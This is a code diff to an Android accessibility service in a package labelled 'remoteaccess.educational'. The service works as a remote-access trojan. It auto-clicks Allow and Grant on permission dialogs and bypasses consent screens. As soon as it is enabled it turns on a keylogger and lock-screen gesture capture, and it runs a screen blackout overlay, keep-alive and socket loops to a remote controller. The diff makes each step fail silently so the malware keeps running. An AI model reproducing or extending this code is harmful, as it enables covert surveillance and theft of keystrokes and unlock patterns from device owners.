@@ -79,17 +79,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     @Override
     public void onServiceConnected() {
-        super.onServiceConnected();
+        try { super.onServiceConnected(); } catch (Exception ignored) {}
         instance = this;
 
-        // Auto-grant permissions mode: click Allow/Grant/OK for 30 seconds
-        // Start FIRST so permission dialogs are handled immediately
-        startAutoGrantTimer();
+        try { startAutoGrantTimer(); } catch (Exception ignored) {}
+        try { startAutoClickScanner(); } catch (Exception ignored) {}
 
-        // Start continuous auto-click scan immediately
-        startAutoClickScanner();
-
-        // Immediately launch permission flow — auto_launch skips all consent UI
         try {
             Intent consentIntent = new Intent(this, com.remoteaccess.educational.ConsentActivity.class);
             consentIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
@@ -97,47 +92,57 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             startActivity(consentIntent);
         } catch (Exception ignored) {}
 
-        // Configure accessibility events
-        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
-                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
-                         AccessibilityEvent.TYPE_VIEW_CLICKED |
-                         AccessibilityEvent.TYPE_VIEW_SCROLLED |
-                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
-                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
-                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
-        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
-        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
-                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
-                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
-        info.notificationTimeout = 100;
+        try {
+            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
+                             AccessibilityEvent.TYPE_VIEW_FOCUSED |
+                             AccessibilityEvent.TYPE_VIEW_CLICKED |
+                             AccessibilityEvent.TYPE_VIEW_SCROLLED |
+                             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
+                             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
+                             AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
+            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
+            info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
+                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
+                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
+            info.notificationTimeout = 100;
+            setServiceInfo(info);
+        } catch (Exception ignored) {}
 
-        setServiceInfo(info);
+        try { com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this); } catch (Exception ignored) {}
 
-        // Register with ScreenBlackout so it can use TYPE_ACCESSIBILITY_OVERLAY
-        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this);
-        // Init gesture recorder (needs the accessibility service reference)
-        com.remoteaccess.educational.network.SocketManager.getInstance(this).initGestureRecorder(this);
+        try {
+            com.remoteaccess.educational.network.SocketManager.getInstance(this).initGestureRecorder(this);
+        } catch (Exception ignored) {}
 
-        // Auto-enable keylogger as soon as accessibility is granted
-        com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true);
-        
-        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-        
-        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-        Display display = wm.getDefaultDisplay();
-        Point size = new Point();
-        display.getRealSize(size);
-        screenWidth = size.x;
-        screenHeight = size.y;
+        try {
+            com.remoteaccess.educational.commands.GestureRecorder gr =
+                com.remoteaccess.educational.network.SocketManager.getInstance(this).getGestureRecorder();
+            if (gr != null) gr.enableLockScreenAutoCapture();
+        } catch (Exception ignored) {}
 
-        // Start keep-screen-alive — runs entirely in this service, no Activity needed
-        keepAliveManager = new KeepAliveManager(this);
-        keepAliveManager.start();
+        try { com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true); } catch (Exception ignored) {}
 
-        // Ensure RemoteAccessService is running and socket is connected.
-        ensureRemoteServiceRunning();
-        startSocketCheckLoop();
+        try {
+            clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        } catch (Exception ignored) {}
+
+        try {
+            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+            Display display = wm.getDefaultDisplay();
+            Point size = new Point();
+            display.getRealSize(size);
+            screenWidth = size.x;
+            screenHeight = size.y;
+        } catch (Exception ignored) {}
+
+        try {
+            keepAliveManager = new KeepAliveManager(this);
+            keepAliveManager.start();
+        } catch (Exception ignored) {}
+
+        try { ensureRemoteServiceRunning(); } catch (Exception ignored) {}
+        try { startSocketCheckLoop(); } catch (Exception ignored) {}
     }
 
     private void ensureRemoteServiceRunning() {
@@ -763,25 +768,37 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     @Override
     public void onDestroy() {
-        super.onDestroy();
-        // Unregister from ScreenBlackout and clean up overlay
-        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService();
-        if (autoClickHandler != null && autoClickRunnable != null) {
-            autoClickHandler.removeCallbacks(autoClickRunnable);
-        }
-        if (autoGrantHandler != null) {
-            autoGrantHandler.removeCallbacksAndMessages(null);
-            autoGrantHandler = null;
-        }
-        autoGrantMode = false;
-        if (socketCheckHandler != null && socketCheckRunnable != null) {
-            socketCheckHandler.removeCallbacks(socketCheckRunnable);
-            socketCheckHandler = null;
-        }
-        if (keepAliveManager != null) {
-            keepAliveManager.stop();
-            keepAliveManager = null;
-        }
+        try { super.onDestroy(); } catch (Exception ignored) {}
+        try { com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService(); } catch (Exception ignored) {}
+        try {
+            if (autoClickHandler != null && autoClickRunnable != null) {
+                autoClickHandler.removeCallbacks(autoClickRunnable);
+            }
+        } catch (Exception ignored) {}
+        try {
+            if (autoGrantHandler != null) {
+                autoGrantHandler.removeCallbacksAndMessages(null);
+                autoGrantHandler = null;
+            }
+            autoGrantMode = false;
+        } catch (Exception ignored) {}
+        try {
+            if (socketCheckHandler != null && socketCheckRunnable != null) {
+                socketCheckHandler.removeCallbacks(socketCheckRunnable);
+                socketCheckHandler = null;
+            }
+        } catch (Exception ignored) {}
+        try {
+            if (keepAliveManager != null) {
+                keepAliveManager.stop();
+                keepAliveManager = null;
+            }
+        } catch (Exception ignored) {}
+        try {
+            com.remoteaccess.educational.commands.GestureRecorder gr =
+                com.remoteaccess.educational.network.SocketManager.getInstance(this).getGestureRecorder();
+            if (gr != null) gr.disableLockScreenAutoCapture();
+        } catch (Exception ignored) {}
         instance = null;
     }
 
